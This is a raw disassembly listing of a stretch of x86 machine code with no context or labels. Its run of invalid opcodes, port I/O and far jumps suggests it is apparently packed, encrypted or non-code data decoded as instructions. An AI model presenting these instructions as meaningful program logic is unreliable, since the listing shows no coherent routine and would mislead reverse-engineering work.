  40f06e:	cmp    eax,0xa7fbef4d
  40f073:	dec    edi
  40f074:	jge    0x40f076
	...
  40f0be:	add    ah,ch
  40f0c0:	ss ins BYTE PTR es:[edi],dx
  40f0c2:	or     esi,edi
  40f0c4:	pop    ebx
  40f0c5:	in     eax,dx
  40f0c6:	test   DWORD PTR [edi-0x26],0x80cb9ed2
  40f0cd:	pop    ebx
  40f0ce:	mov    dl,0x8f
  40f0d0:	test   BYTE PTR [eax],0x0
  40f0d3:	push   ds
  40f0d4:	pop    es
  40f0d5:	add    BYTE PTR [eax],al
  40f0d7:	or     DWORD PTR es:[edx-0x24],ebx
  40f0db:	jecxz  0x40f0ea
  40f0dd:	xchg   al,ah
  40f0df:	(bad)  
  40f0e0:	jb     0x40f0c9
  40f0e2:	jmp    0x40f156
  40f0e4:	mov    esi,0x100a01e3
  40f0e9:	xor    DWORD PTR [ecx],edx
  40f0eb:	sub    ah,BYTE PTR [edx+eax*1-0x73]
  40f0ef:	and    eax,0xa12b0c0
  40f0f4:	cld    
  40f0f5:	jecxz  0x40f0e8
  40f0f7:	sub    DWORD PTR [esi-0x51],eax
  40f0fa:	pop    eax
  40f0fb:	push   esp
  40f0fc:	int3   
  40f0fd:	push   cs
  40f0fe:	add    bl,BYTE PTR [eiz*1+0x5a7e751]
  40f105:	dec    esi
  40f106:	add    al,0x9
  40f108:	pop    ss
  40f109:	mov    ch,BYTE PTR [eax-0x43]
  40f10c:	inc    edx
  40f10d:	mov    ds:0xdddd40e8,al
  40f112:	ror    DWORD PTR [edi+ebx*4-0xfd03519],0x87
  40f11a:	push   ecx
  40f11b:	mov    esi,0x4f6362b3
  40f120:	lods   eax,DWORD PTR ds:[esi]
  40f121:	lahf   
  40f122:	sbb    DWORD PTR ds:0xbc2ac890,esi
  40f128:	inc    edx
  40f129:	div    BYTE PTR [edi+0x39fa65e0]
  40f12f:	jns    0x40f0ef
  40f131:	out    dx,eax
  40f132:	jmp    0x40f14d
  40f134:	or     eax,ebp
  40f136:	adc    edx,DWORD PTR fs:[ecx]
  40f139:	mov    es,WORD PTR [ebp-0x3f]
  40f13c:	stos   DWORD PTR es:[edi],eax
  40f13d:	in     eax,dx
  40f13e:	neg    DWORD PTR [edi-0x1d8277a]
  40f144:	add    BYTE PTR [edx],ch
  40f146:	inc    edi
  40f147:	test   ebp,ebx
  40f149:	sahf   
  40f14a:	cmp    esi,DWORD PTR es:[edx-0x34b7cc9e]
  40f151:	mov    ah,0x32
  40f153:	ret    
  40f154:	fisttp QWORD PTR ss:[eax]
  40f157:	rcr    DWORD PTR [edi-0x51d1086b],0x38
  40f15e:	xor    eax,0x48a7cdbe
  40f163:	int    0x9e
  40f165:	mov    bh,0x9a
  40f167:	out    0x8,eax
  40f169:	adc    ch,bh
  40f16b:	mov    esi,0xa713ff59
  40f170:	xor    eax,0xf3b9ea8e
  40f175:	das    
  40f176:	in     al,0x7e
  40f178:	pop    esp
  40f179:	push   0x154ad4a5
  40f17e:	lods   eax,DWORD PTR ds:[esi]
  40f17f:	in     al,dx
  40f180:	xor    ah,0xa5
  40f183:	add    eax,0xa82d7563
  40f188:	(bad)  
  40f189:	jle    0x40f11c
  40f18b:	imul   ch
  40f18d:	ret    0xf275
  40f190:	and    al,dh
  40f192:	inc    esi
  40f193:	pop    eax
  40f194:	mov    ebp,0x1090642b
  40f199:	push   0xffffff80
  40f19b:	pusha  
  40f19c:	call   0xdb6fa837
  40f1a1:	das    
  40f1a2:	jge    0x40f166
  40f1a4:	cs (bad) 
  40f1a7:	xlat   BYTE PTR ds:[ebx]
  40f1a8:	out    0x17,eax
  40f1aa:	dec    eax
  40f1ab:	xchg   edi,eax
  40f1ac:	push   ebx
  40f1ad:	repz add eax,0x116697ba
  40f1b3:	adc    BYTE PTR [ecx-0x1b],al
  40f1b6:	arpl   WORD PTR [esi+edi*8+0x2106670e],bp
  40f1bd:	mov    dl,0x1c
  40f1bf:	xor    al,0x28
  40f1c1:	hlt    
  40f1c2:	push   ds
  40f1c3:	mov    es,WORD PTR [eax]
  40f1c5:	scas   al,BYTE PTR es:[edi]
  40f1c6:	(bad)  
  40f1c7:	fstp   QWORD PTR [ebp-0x4c6077cd]
  40f1cd:	xchg   ecx,eax
  40f1ce:	mov    bh,0xcd
  40f1d0:	xchg   BYTE PTR [esi-0x67],dl
  40f1d3:	(bad)  [esp+ecx*1]
  40f1d6:	ret    
  40f1d7:	jl     0x40f1be
  40f1d9:	fwait
  40f1da:	sub    eax,0xbc965e5e
  40f1df:	push   cs
  40f1e0:	push   edi
  40f1e1:	lds    edi,FWORD PTR [edi-0x3f0bba74]
  40f1e7:	imul   esp,DWORD PTR [esi+0xf],0x37
  40f1eb:	sub    esp,DWORD PTR [eax]
  40f1ed:	pop    ss
  40f1ee:	(bad)  
  40f1ef:	mov    ebx,0x87e01c56
  40f1f4:	nop
  40f1f5:	jb     0x40f1db
  40f1f7:	enter  0xd4d8,0x16
  40f1fb:	mov    cl,0x3a
  40f1fd:	out    dx,eax
  40f1fe:	mov    ds:0xef32978,al
  40f203:	ret    0x3d87
  40f206:	xor    eax,0xb5e6691
  40f20b:	jecxz  0x40f252
  40f20d:	cmp    edi,DWORD PTR [esi-0x80]
  40f210:	loop   0x40f272
  40f212:	adc    ah,BYTE PTR [edi+0x401ff446]
  40f218:	cmp    al,0x68
  40f21a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f21b:	xchg   DWORD PTR [ebp+0x48],ebp
  40f21e:	add    eax,0x58767d1
  40f223:	mov    al,ds:0x3173f911
  40f228:	push   ds
  40f229:	sub    edx,eax
  40f22b:	mov    ebp,0xf23e08eb
  40f230:	jecxz  0x40f201
  40f232:	loop   0x40f1d7
  40f234:	inc    esp
  40f235:	aam    0xe2
  40f237:	jbe    0x40f1c9
  40f239:	pop    ecx
  40f23a:	out    0x45,al
  40f23c:	enter  0xf268,0x21
  40f240:	(bad)  
  40f242:	cdq    
  40f243:	jge    0x40f1da
  40f245:	and    BYTE PTR [edx-0x7cab6347],bl
  40f24b:	and    BYTE PTR [edi+0x3489db5e],bl
  40f251:	xor    al,0x6
  40f253:	nop
  40f254:	mov    esi,0xb65f032e
  40f259:	adc    al,0x21
  40f25b:	not    DWORD PTR [eax-0x2d]
  40f25e:	sbb    BYTE PTR [eax-0x203586f7],cl
  40f264:	shr    BYTE PTR [esi],0x86
  40f267:	out    0x6f,al
  40f269:	test   eax,0x2250871f
  40f26e:	push   ebx
  40f26f:	push   esi
  40f270:	test   eax,0x397d07bc
  40f275:	push   ss
  40f276:	jno    0x40f25f
  40f278:	les    edi,FWORD PTR [edx+esi*2-0x6398bb73]
  40f27f:	mov    ebp,0x1dc1df75
  40f284:	mov    esp,es
  40f286:	sahf   
  40f287:	inc    ebx
  40f288:	imul   edx,DWORD PTR [ecx-0x8],0x451b990c
  40f28f:	imul   esi,ecx,0x5a
  40f292:	jo     0x40f227
  40f294:	jp     0x40f298
  40f296:	sahf   
  40f297:	stos   DWORD PTR es:[edi],eax
  40f298:	aam    0xce
  40f29a:	fdiv   DWORD PTR [esi+0xe]
  40f29d:	xor    ebx,esp
  40f29f:	xor    ebx,DWORD PTR [eax-0x7a5f223d]
  40f2a5:	ret    
  40f2a6:	jge    0x40f23f
  40f2a8:	lds    esi,FWORD PTR [eax]
  40f2aa:	sahf   
  40f2ab:	push   ss
  40f2ac:	sahf   
  40f2ad:	add    DWORD PTR [edx],ebp
  40f2af:	xchg   edi,ebx
  40f2b1:	mov    al,0xe8
  40f2b3:	arpl   WORD PTR ds:0x88f59a3c,sp
  40f2b9:	push   es
  40f2ba:	xor    DWORD PTR [eax-0x2676902b],edi
  40f2c0:	(bad)  
  40f2c1:	jb     0x40f2e9
  40f2c3:	push   ss
  40f2c4:	and    DWORD PTR [esi+ecx*1],edi
  40f2c7:	ficom  WORD PTR cs:[edi+0x561c869b]
  40f2ce:	add    DWORD PTR [ebp+edi*4-0x18],ebp
  40f2d2:	call   0xf6cd:0x64e7f6b9
  40f2d9:	gs imul eax,ebx,0xffffff89
  40f2dd:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40f2df:	and    BYTE PTR [edi],dl
  40f2e1:	sub    BYTE PTR [eax+0x10],ch
  40f2e4:	aaa    
  40f2e5:	pop    ebp
  40f2e6:	push   ebx
  40f2e7:	out    dx,eax
  40f2e8:	push   es
  40f2e9:	retf   0x4e5f
  40f2ec:	clc    
  40f2ed:	lahf   
  40f2ee:	imul   DWORD PTR [edx]
  40f2f0:	pop    esi
  40f2f1:	pop    esi
  40f2f2:	es push eax
  40f2f4:	mov    ecx,0x24dcd336
  40f2f9:	les    ecx,FWORD PTR [eax+0x17]
  40f2fc:	test   eax,0xe621c57
  40f301:	mov    ch,0xf7
  40f303:	pop    ss
  40f304:	mov    al,ds:0x8c67c97
  40f309:	inc    ebp
  40f30a:	cld    
  40f30b:	add    ebp,DWORD PTR [ebx]
  40f30d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f30e:	mov    esp,DWORD PTR [edi+esi*4+0x5bf76126]
  40f315:	retf   
  40f316:	adc    eax,0xf8b3263
  40f31b:	push   esp
  40f31c:	dec    esp
  40f31d:	pop    ebx
  40f31e:	popa   
  40f31f:	leave  
  40f320:	push   esi
  40f321:	repz mov esp,0xc95226cc
  40f327:	sahf   
  40f328:	cdq    
  40f329:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40f32b:	ret    
  40f32c:	lods   al,BYTE PTR ds:[esi]
  40f32d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f32e:	(bad)  
  40f32f:	lds    esi,FWORD PTR [edx]
  40f331:	pushf  
  40f332:	shl    ah,1
  40f334:	add    al,BYTE PTR [bx+0x7565]
  40f339:	jo     0x40f370
  40f33b:	les    edx,FWORD PTR ds:0xe8fa8f2c
  40f341:	dec    edx
  40f342:	mov    al,ds:0xe4bd6803
  40f347:	cs inc esi
  40f349:	jb     0x40f370
  40f34b:	stos   BYTE PTR es:[edi],al
  40f34c:	push   es
  40f34d:	call   0xf68e:0xfdd2061c
  40f354:	aaa    
  40f355:	retf   
  40f356:	jge    0x40f3b1
  40f358:	fldenv [esi+ecx*4-0x51472745]
  40f35f:	call   FWORD PTR [ecx+0xe]
  40f362:	nop
  40f363:	or     DWORD PTR [edi+0x56d44c18],ebx
  40f369:	(bad)  
  40f36a:	xor    dh,BYTE PTR [esi]
  40f36c:	loop   0x40f361
  40f36e:	shr    BYTE PTR [ecx-0x70dcddf1],cl
  40f374:	(bad)  
  40f375:	and    eax,0xa2042757
  40f37a:	fwait
  40f37b:	push   esi
  40f37c:	icebp  
  40f37d:	xor    DWORD PTR [ecx-0x7c],eax
  40f380:	and    eax,0xc079e847
  40f385:	inc    esi
  40f386:	scas   eax,DWORD PTR es:[edi]
  40f387:	(bad)  
  40f388:	jae    0x40f3c8
  40f38a:	sub    BYTE PTR [ebx-0x5de7966d],cl
  40f390:	clc    
  40f391:	xor    dh,dl
  40f393:	aaa    
  40f394:	int    0xac
  40f396:	push   cs
  40f397:	mov    ah,0xb6
  40f399:	xor    BYTE PTR [ecx],0xc7
  40f39c:	push   ebp
  40f39d:	mov    ecx,esp
  40f39f:	ss adc ch,dh
  40f3a2:	stc    
  40f3a3:	or     edi,DWORD PTR [esi+0x4efea2fa]
  40f3a9:	xlat   BYTE PTR ds:[ebx]
  40f3aa:	test   DWORD PTR [ebp-0x67],ebp
  40f3ad:	sar    bh,0xcb
  40f3b0:	daa    
  40f3b1:	cmp    edi,DWORD PTR [edx]
  40f3b3:	ds std 
  40f3b5:	(bad)  
  40f3b6:	in     al,dx
  40f3b7:	push   0x41
  40f3b9:	mov    ecx,0x2be9083
  40f3be:	sbb    bh,ch
  40f3c0:	cmp    ebp,eax
  40f3c2:	cmc    
  40f3c3:	dec    edi
  40f3c4:	xlat   BYTE PTR ds:[ebx]
  40f3c5:	jb     0x40f3b0
  40f3c7:	aaa    
  40f3c8:	sbb    DWORD PTR [ecx+0x515c1815],ecx
  40f3ce:	mov    eax,0x581255c1
  40f3d3:	or     BYTE PTR [ecx+0x207e883c],dh
  40f3d9:	das    
  40f3da:	loop   0x40f40f
  40f3dc:	sub    ebx,DWORD PTR [edx+0x543c6fdd]
  40f3e2:	rcl    DWORD PTR [ecx],0xdc
  40f3e5:	or     DWORD PTR [eax-0x4e],edx
  40f3e8:	ds into 
  40f3ea:	push   ecx
  40f3eb:	ficomp DWORD PTR [ecx]
  40f3ed:	sub    BYTE PTR es:[eax],bl
  40f3f0:	test   BYTE PTR [edx+ebx*8+0x6b],bh
  40f3f4:	pop    esp
  40f3f5:	adc    esi,edx
  40f3f7:	outs   dx,DWORD PTR ds:[esi]
  40f3f8:	les    edx,FWORD PTR [ebx+eax*8+0x5a]
  40f3fc:	mov    edi,0x64f718a4
  40f401:	cdq    
  40f402:	add    dh,cl
  40f404:	retf   
  40f405:	out    0x46,al
  40f407:	fistp  DWORD PTR [edi+0xc16898a]
  40f40d:	popf   
  40f40e:	xchg   ebp,eax
  40f40f:	test   BYTE PTR [edx+0x40d9b939],bh
  40f415:	cmp    al,0xc0
  40f417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f418:	sub    al,0x4b
  40f41a:	lock mov ebx,0x7246440f
  40f420:	cmp    eax,0xb5afffb2
  40f425:	ins    DWORD PTR es:[edi],dx
  40f426:	mov    dh,0xc5
  40f428:	cwde   
  40f429:	xchg   esp,eax
  40f42a:	cmp    eax,0x869377ab
  40f42f:	jle    0x40f488
  40f431:	sbb    eax,0x905a3bbc
  40f436:	xchg   ebp,eax
  40f437:	mov    cl,0xeb
  40f439:	pop    ecx
  40f43a:	das    
  40f43b:	dec    eax
  40f43c:	mov    DWORD PTR [ebx+0x30],edx
  40f43f:	cld    
  40f440:	or     esp,DWORD PTR [edx-0xd]
  40f443:	ss test ebp,eax
  40f446:	mov    al,ds:0x25a1dc18
  40f44b:	inc    esi
  40f44c:	shr    DWORD PTR [ebx+0x7f],1
  40f44f:	dec    edi
  40f450:	cs aam 0x96
  40f453:	add    DWORD PTR [ebx],esp
  40f455:	mov    ch,0x2d
  40f457:	mov    dh,0x8a
  40f459:	sbb    ebp,edi
  40f45b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f45c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f45d:	fisub  WORD PTR [eax+0x5dc32ed7]
  40f463:	push   es
  40f464:	hlt    
  40f465:	push   es
  40f466:	outs   dx,DWORD PTR ds:[esi]
  40f467:	sub    al,0x8
  40f469:	cmp    al,0x9b
  40f46b:	pop    edi
  40f46c:	jns    0x40f425
  40f46e:	mov    eax,0x6bdbe8f7
  40f473:	jns    0x40f4be
  40f475:	jb     0x40f4e5
  40f477:	xchg   DWORD PTR [edi-0x54],ecx
  40f47a:	sub    al,0x34
  40f47c:	rcl    DWORD PTR [edi-0x7ff4d8b2],1
  40f482:	mov    cl,al
  40f484:	arpl   bp,cx
  40f486:	add    al,BYTE PTR ds:[ebp-0x6f1c8770]
  40f48d:	xor    dh,BYTE PTR [eax+0x4e770ee4]
  40f493:	adc    dl,BYTE PTR [edx+0x322e9747]
  40f499:	ds retf 0x328
  40f49d:	mov    eax,0x4e327f33
  40f4a2:	add    cl,BYTE PTR [edi]
  40f4a4:	addr16 jl 0x40f501
  40f4a7:	inc    eax
  40f4a8:	mov    esi,0xa865e670
  40f4ad:	retf   0x4717
  40f4b0:	dec    eax
  40f4b1:	pop    DWORD PTR [esi-0x3b17246d]
  40f4b7:	ret    0x5444
  40f4ba:	test   DWORD PTR [ebp+0x69eef99a],0x3ffea592
  40f4c4:	push   es
  40f4c5:	sbb    al,0xee
  40f4c7:	pop    edx
  40f4c8:	cli    
  40f4c9:	(bad)  
  40f4ca:	(bad)  
  40f4cb:	sbb    al,0xe4
  40f4cd:	cmp    al,0x2b
  40f4cf:	loopne 0x40f525
  40f4d1:	imul   edi,DWORD PTR ds:0x424b2695,0xffffffaf
  40f4d8:	jnp    0x40f47e
  40f4da:	scas   al,BYTE PTR es:[edi]
  40f4db:	mov    ch,0x92
  40f4dd:	jne    0x40f497
  40f4df:	das    
  40f4e0:	loop   0x40f4a1
  40f4e2:	and    ch,BYTE PTR [edi+0x2e]
  40f4e5:	call   0xff0a:0x72bff220
  40f4ec:	sbb    eax,0x115938b3
  40f4f1:	icebp  
  40f4f2:	adc    bl,BYTE PTR [ebp+0x68]
  40f4f5:	scas   al,BYTE PTR es:[edi]
  40f4f6:	leave  
  40f4f7:	and    al,0xc3
  40f4f9:	gs sar eax,cl
  40f4fc:	and    ebp,DWORD PTR [ebx+0x13]
  40f4ff:	dec    ebp
  40f500:	dec    ecx
  40f501:	je     0x40f500
  40f503:	mov    ch,0xa2
  40f505:	int    0x72
  40f507:	outs   dx,BYTE PTR ds:[esi]
  40f508:	aaa    
  40f509:	jmp    0x554af275
  40f50e:	or     DWORD PTR [edx-0x57],ebp
  40f511:	iret   
  40f512:	push   edi
  40f513:	xor    ebp,DWORD PTR [ecx-0x40f6620]
  40f519:	jg     0x40f4d3
  40f51b:	test   BYTE PTR [esi+0x67],cl
  40f51e:	and    DWORD PTR [ebx],esi
  40f520:	add    ch,BYTE PTR [ecx-0x52]
  40f523:	fdiv   QWORD PTR [ebp-0x790f4f4a]
  40f529:	jmp    0xeab3:0xa89288c1
  40f530:	outs   dx,BYTE PTR ds:[esi]
  40f531:	push   0x1d
  40f533:	jmp    0xa8cfb51f
  40f538:	leave  
  40f539:	jmp    0xe83b:0xa70ef027
  40f540:	sar    DWORD PTR [edi-0x18],0x3
  40f544:	nop
  40f545:	ds adc al,0x5c
  40f548:	pop    eax
  40f549:	xchg   esp,eax
  40f54a:	ficomp WORD PTR [ebx+ebx*1-0x255e7dcc]
  40f551:	es mov esi,0xb5651c4c
  40f557:	push   esp
  40f558:	mov    eax,cs
  40f55a:	dec    ebx
  40f55b:	fdiv   st,st(7)
  40f55d:	repnz or al,0x33
  40f560:	rcr    DWORD PTR ds:0x74c0e558,cl
  40f566:	sub    al,0x3d
  40f568:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f56a:	mov    dl,0x6b
  40f56c:	sub    DWORD PTR [ecx-0x50],0x56dd7a0f
  40f573:	mov    edi,0x88077a74
  40f578:	push   ds
  40f579:	jo     0x40f5e9
  40f57b:	jg     0x40f5e9
  40f57d:	pop    esp
  40f57e:	cmp    ebp,DWORD PTR [ecx+0xa0f3981]
  40f584:	sub    ebx,DWORD PTR [edx]
  40f586:	and    eax,0xc29c925e
  40f58b:	sbb    eax,0x7ce7d284
  40f590:	lahf   
  40f591:	loop   0x40f59b
  40f593:	xor    ch,BYTE PTR [eax-0x6b]
  40f596:	mov    dl,0x56
  40f598:	(bad)  
  40f599:	xchg   ebp,eax
  40f59a:	in     al,dx
  40f59b:	mov    al,ah
  40f59d:	jmp    0xca71bb57
  40f5a2:	jecxz  0x40f534
  40f5a4:	mov    es,WORD PTR [esi+ebp*4]
  40f5a7:	fld    DWORD PTR [edx+edx*1+0x61c5ab8f]
  40f5ae:	ret    0xf913
  40f5b1:	pushf  
  40f5b2:	xchg   DWORD PTR [ecx+0x4380b43c],ecx
  40f5b8:	add    al,0x79
  40f5ba:	fcomp  DWORD PTR [ebx+0x6cf3f8c]
  40f5c0:	or     bh,bl
  40f5c2:	cdq    
  40f5c3:	dec    edx
  40f5c4:	inc    esi
  40f5c5:	pop    eax
  40f5c6:	inc    esi
  40f5c7:	add    ah,al
  40f5c9:	jmp    0xedc9cf83
  40f5ce:	inc    esi
  40f5cf:	xchg   ebx,edi
  40f5d1:	pop    ebx
  40f5d2:	div    DWORD PTR [esi]
  40f5d4:	or     bh,BYTE PTR ds:0xca8cd153
  40f5da:	test   al,0xd1
  40f5dc:	shr    DWORD PTR [esi],1
  40f5de:	dec    ecx
  40f5df:	inc    ebp
  40f5e0:	inc    ebp
  40f5e1:	jecxz  0x40f64a
  40f5e3:	push   ss
  40f5e4:	sti    
  40f5e5:	pop    esi
  40f5e6:	popa   
  40f5e7:	and    ecx,edi
  40f5e9:	mov    ebx,0x402f0c1
  40f5ee:	sti    
  40f5ef:	lods   eax,DWORD PTR ds:[esi]
  40f5f0:	or     al,0xb7
  40f5f2:	push   eax
  40f5f3:	cmp    eax,ebx
  40f5f5:	push   DWORD PTR [ebp-0x7a]
  40f5f8:	out    dx,al
  40f5f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5fa:	or     esp,DWORD PTR [ecx+ebx*1]
  40f5fd:	jb     0x40f5bb
  40f5ff:	xchg   edx,eax
  40f600:	mov    esi,ebx
  40f602:	jbe    0x40f682
  40f604:	outs   dx,DWORD PTR ds:[esi]
  40f605:	mov    ecx,0xe966d8fa
  40f60a:	sbb    ebx,DWORD PTR [ecx-0x4f]
  40f60d:	repz cdq 
  40f60f:	inc    edi
  40f610:	xchg   ecx,eax
  40f611:	jnp    0x40f67d
  40f613:	pop    ebp
  40f614:	retf   0xfe39
  40f617:	adc    ebp,ebp
  40f619:	(bad)  
  40f61a:	enter  0x528e,0x2d
  40f61e:	jns    0x40f68c
  40f620:	(bad)  
  40f621:	lds    ebp,FWORD PTR [ecx]
  40f623:	fwait
  40f624:	and    eax,0x9e024773
  40f629:	shr    DWORD PTR [edx-0x291cb765],0x2
  40f630:	sti    
  40f631:	sahf   
  40f632:	sbb    dl,BYTE PTR [ebx]
  40f634:	repnz pop ebp
  40f636:	mov    DWORD PTR [ebp+0x65],edi
  40f639:	scas   eax,DWORD PTR es:[edi]
  40f63a:	xchg   ecx,eax
  40f63b:	mov    ecx,0xb1a4dad0
  40f640:	rcl    DWORD PTR [esi],cl
  40f642:	pop    edi
  40f643:	mov    ah,al
  40f645:	sahf   
  40f646:	out    dx,eax
  40f647:	pop    edi
  40f648:	or     eax,DWORD PTR [edx]
  40f64a:	(bad)  
  40f64b:	in     eax,dx
  40f64c:	cmpps  xmm0,XMMWORD PTR [edi-0x1aa58390],0xf7
  40f654:	mov    ds:0x65680122,eax
  40f659:	adc    DWORD PTR [ecx-0x49bf064e],esi
  40f65f:	icebp  
  40f660:	ror    BYTE PTR [ebx],0x2f
  40f663:	arpl   WORD PTR [edx-0x6c],dx
  40f666:	sbb    eax,0x2367068f
  40f66b:	out    dx,eax
  40f66c:	pop    edx
  40f66d:	xor    al,al
  40f66f:	jmp    0xa7e7:0x6f6a941d
  40f676:	int    0xcf
  40f678:	movss  xmm3,DWORD PTR [ebx-0x1aef6ab8]
  40f680:	and    edi,DWORD PTR [ebx]
  40f682:	dec    ebp
  40f683:	cmp    bl,ah
  40f685:	pop    ebx
  40f686:	out    dx,eax
  40f687:	mov    eax,0x1826c3a0
  40f68c:	xlat   BYTE PTR ds:[ebx]
  40f68d:	aad    0x88
  40f68f:	pop    ebx
  40f690:	add    DWORD PTR [esi],ebx
  40f692:	lock loop 0x40f68b
  40f695:	adc    eax,0x9cf474bb
  40f69a:	aas    
  40f69b:	mov    DWORD PTR [esi],eax
  40f69d:	int3   
  40f69e:	sar    DWORD PTR [esi],1
  40f6a0:	jmp    0x3339:0xe58704f6
  40f6a7:	jns    0x40f630
  40f6a9:	dec    esi
  40f6aa:	es loop 0x40f67e
  40f6ad:	test   al,0x4d
  40f6af:	daa    
  40f6b0:	cmp    edx,ebx
  40f6b2:	iret   
  40f6b3:	mov    dh,0x98
  40f6b5:	enter  0x7b0f,0x32
  40f6b9:	scas   al,BYTE PTR es:[edi]
  40f6ba:	cdq    
  40f6bb:	cmp    BYTE PTR [ecx+ecx*1-0x63335d57],ch
  40f6c2:	xor    eax,0xabaae9d8
  40f6c7:	mov    ?,WORD PTR [esi]
  40f6c9:	fidiv  WORD PTR [ecx-0x25]
  40f6cc:	icebp  
  40f6cd:	jbe    0x40f68e
  40f6cf:	fdiv   DWORD PTR [eax+0x3ccd8eb5]
  40f6d5:	pushf  
  40f6d6:	sub    edx,DWORD PTR [edx+0x3391ccef]
  40f6dc:	xchg   ecx,eax
  40f6dd:	sahf   
  40f6de:	add    edi,edx
  40f6e0:	std    
  40f6e1:	jns    0x40f70c
  40f6e3:	xchg   esi,eax
  40f6e4:	mov    edi,0x8bea2db6
  40f6e9:	and    dh,0x52
  40f6ec:	aad    0xc4
  40f6ee:	loop   0x40f6fa
  40f6f0:	retf   
  40f6f1:	mov    BYTE PTR [esi],0x8
  40f6f4:	in     al,0xf
  40f6f6:	loope  0x40f766
  40f6f8:	or     DWORD PTR ss:[edi+eiz*4-0x72],0x5f
  40f6fe:	dec    esi
  40f6ff:	adc    al,0x7b
  40f701:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f702:	sub    DWORD PTR [esi-0x6bd86993],0x99214acc
  40f70c:	push   cs
  40f70d:	push   ebx
  40f70f:	icebp  
  40f710:	xchg   edi,eax
  40f711:	(bad)  
  40f712:	imul   edx,esi,0x65204a90
  40f718:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f719:	push   edx
  40f71a:	cmp    eax,0x22aa637b
  40f71f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f720:	and    DWORD PTR [ebp-0x60],0x853e7d13
  40f727:	mov    DWORD PTR [esi],0xeaf61c52
  40f72d:	lds    eax,FWORD PTR [ebp+0x10cef150]
  40f733:	dec    edi
  40f734:	mov    ebx,DWORD PTR [esi]
  40f736:	hlt    
  40f737:	rcr    DWORD PTR [ebx],cl
  40f739:	mov    ds:0x5acd1f71,al
  40f73e:	jle    0x40f712
  40f740:	adc    eax,0x5e7c4e82
  40f745:	dec    ebp
  40f746:	inc    ecx
  40f747:	mov    es,WORD PTR [esi]
  40f749:	imul   bl
  40f74b:	popf   
  40f74c:	xchg   BYTE PTR [edi+0x5a],dh
  40f74f:	pop    edx
  40f750:	add    dh,dl
  40f752:	mov    eax,ds:0xbcb4dc3d
  40f757:	push   ecx
  40f758:	mov    bl,0x34
  40f75a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f75b:	or     DWORD PTR [edi+0x47],esi
  40f75e:	(bad)  
  40f760:	fbld   TBYTE PTR [ebx-0x52]
  40f763:	xor    eax,0x28ed2742
  40f768:	mov    dl,0x1c
  40f76a:	mov    ds:0x4e6f5e95,eax
  40f76f:	inc    eax
  40f770:	pop    eax
  40f771:	cmc    
  40f772:	icebp  
  40f773:	sbb    DWORD PTR [esi-0x13],ebx
  40f776:	push   0xffffff94
  40f778:	icebp  
  40f779:	cmp    bh,BYTE PTR [edi+0x26b44e57]
  40f77f:	(bad)  
  40f780:	bound  eax,QWORD PTR [ebx+0x627026b6]
  40f786:	jmp    0x40f736
  40f788:	inc    edx
  40f789:	or     DWORD PTR [ecx],edi
  40f78b:	xchg   BYTE PTR [edx],bl
  40f78d:	cdq    
  40f78e:	rcr    BYTE PTR cs:[edx-0x1a],0x2b
  40f793:	dec    ecx
  40f794:	or     DWORD PTR [edi-0x4b4ea9ea],edi
  40f79a:	hlt    
  40f79b:	cmp    esi,DWORD PTR [edx]
  40f79d:	jl     0x40f750
  40f79f:	mov    eax,ds:0xa06b88c2
  40f7a4:	int    0xfd
  40f7a6:	stos   DWORD PTR es:[edi],eax
  40f7a7:	mov    bl,0xc6
  40f7a9:	sbb    esp,esp
  40f7ab:	popa   
  40f7ac:	push   ecx
  40f7ad:	mov    cl,0xd2
  40f7af:	and    BYTE PTR [esi+0x48084d36],ah
  40f7b5:	in     eax,dx
  40f7b6:	es in  al,0x6b
  40f7b9:	push   ss
  40f7ba:	jae    0x40f75a
  40f7bc:	pop    edi
  40f7bd:	mov    bl,0x32
  40f7bf:	jp     0x40f783
  40f7c1:	dec    esi
  40f7c2:	dec    ebx
  40f7c3:	ret    
  40f7c4:	bound  ecx,QWORD PTR [esi]
  40f7c6:	push   cs
  40f7c7:	stos   BYTE PTR es:[edi],al
  40f7c8:	jae    0x40f76b
  40f7ca:	cmp    esi,DWORD PTR [edi+esi*2-0x663f243e]
  40f7d1:	pushf  
  40f7d2:	mov    al,0xa8
  40f7d4:	imul   edx,esi,0xffffff87
  40f7d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7d8:	inc    edx
  40f7d9:	sub    DWORD PTR ds:0xda54b87f,0x61
  40f7e0:	lods   al,BYTE PTR ds:[esi]
  40f7e1:	and    BYTE PTR [esi-0x3b8cfd30],cl
  40f7e7:	adc    al,0x63
  40f7e9:	out    0xcb,al
  40f7eb:	adc    DWORD PTR [edi+edx*1-0x9348d3],esp
  40f7f2:	add    bh,0x51
	...
  40f83d:	add    BYTE PTR [eax],al
  40f83f:	adc    DWORD PTR [ebp-0x1caa2],esp
  40f845:	jnp    0x40f7ec
  40f847:	int    0xa1
  40f849:	ficom  WORD PTR [ebx+esi*8-0x2f]
  40f84d:	mov    edx,0xfdad96
  40f852:	add    BYTE PTR [esi],bl
  40f854:	pop    es
  40f855:	add    BYTE PTR [eax],al
  40f857:	sub    al,dh
  40f859:	cli    
  40f85a:	adc    DWORD PTR [eax],edi
  40f85c:	dec    edx
  40f85d:	les    edx,FWORD PTR [esi]
  40f85f:	cmp    al,0xb4
  40f861:	push   eax
  40f862:	xor    al,0xbf
  40f864:	popf   
  40f865:	xchg   esi,eax
  40f866:	xchg   ebp,eax
  40f867:	sbb    eax,0x484726bf
  40f86c:	out    0x65,al
  40f86e:	xchg   edx,eax
  40f86f:	mov    ah,BYTE PTR [ecx]
  40f871:	mov    ecx,0x1f98e6ab
  40f876:	mov    WORD PTR [esi+edx*4],ss
  40f879:	repnz mov ds:0xa0d36bc4,al
  40f87f:	cdq    
  40f880:	rcr    BYTE PTR [edx],cl
